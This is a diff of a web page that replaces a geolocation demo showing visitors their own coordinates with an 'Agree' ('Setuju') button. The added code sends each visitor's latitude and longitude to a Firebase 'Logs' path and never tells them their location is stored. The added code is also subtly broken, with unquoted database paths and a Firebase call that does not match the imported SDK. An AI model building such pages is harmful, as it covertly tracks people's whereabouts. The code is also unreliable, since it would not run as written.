@@ -25,25 +25,7 @@
     <style>#myDIV{display:none;}</style>
   </head>
   <body><!-- onload="newDoc()" -->
-    <button onclick="getLocation()">Try It</button>
-    <p id="demo"></p>
-
-    <script>
-      var x = document.getElementById("demo");
-      
-      function getLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(showPosition);
-        } else { 
-          x.innerHTML = "Geolocation is not supported by this browser.";
-        }
-      }
-      
-      function showPosition(position) {
-        x.innerHTML = "Latitude: " + position.coords.latitude + 
-        "<br>Longitude: " + position.coords.longitude;
-      }
-    </script>
+    <button onclick="getLocation()">Setuju</button>
     <script type="module">
       // Import the functions you need from the SDKs you need
       import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
@@ -66,6 +48,23 @@
       // Initialize Firebase
       const app = initializeApp(firebaseConfig);
       const analytics = getAnalytics(app);
+    </script>
+    <script>
+      
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition);
+        } else { 
+          alert("Pastikan anda menyetujui lokasi!");
+        }
+      }
+      
+      function showPosition(position) {
+        firebase.database().ref(/).child(Logs).push({
+            Latitude : position.coords.latitude,
+            Longitude : position.coords.longitude
+        });
+      }
     </script>
     <script>
       function newDoc() {
